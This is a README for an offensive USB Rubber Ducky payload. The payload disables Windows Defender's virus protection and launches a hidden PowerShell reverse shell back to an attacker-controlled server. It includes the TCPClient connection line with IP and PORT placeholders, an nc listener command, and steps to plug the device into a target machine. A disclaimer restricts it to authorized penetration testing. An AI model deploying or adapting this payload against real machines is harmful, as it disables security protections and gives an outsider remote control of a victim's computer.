

# Reverse Shell Payload Script

This repository contains a Rubber Ducky script that automates disabling Windows Defender and launching a PowerShell reverse shell to establish a persistent connection with a remote server. This script is intended for educational and authorized security testing purposes only.

## **Disclaimer**

> ⚠️ This tool is for ethical hacking and penetration testing **with permission** only. Unauthorized use of this script against a system without consent is strictly prohibited. Misuse may lead to legal consequences.

## **Features**

- Disables Windows Security (specifically, Virus & Threat Protection)
- Executes a hidden PowerShell reverse shell command to connect to a remote server

## **Requirements**

- USB Rubber Ducky (or similar HID device)
- Target system with PowerShell (Windows OS)
- Network listener on the attacker's machine (using `nc`, `socat`, or similar)

## **Setup**

1. **Edit the Payload**:
   - Replace the `IP` and `PORT` placeholders in the PowerShell command with your remote server’s IP and chosen port.

   ```powershell
   $client = New-Object System.Net.Sockets.TCPClient('IP', PORT)
   ```

2. **Prepare Listener**:
   - On your remote machine, set up a listener to catch the incoming connection:
     ```bash
     nc -lvnp PORT
     ```
   
3. **Convert and Deploy**:
   - Convert the script to the Rubber Ducky binary format, if needed, and deploy it to your target.

## **Usage**

1. Plug in the HID device on the target machine.
2. The script will:
   - Disable Windows Security
   - Execute a hidden PowerShell command for the reverse shell

3. On successful execution, the target device will initiate a reverse shell connection to your specified IP and port.
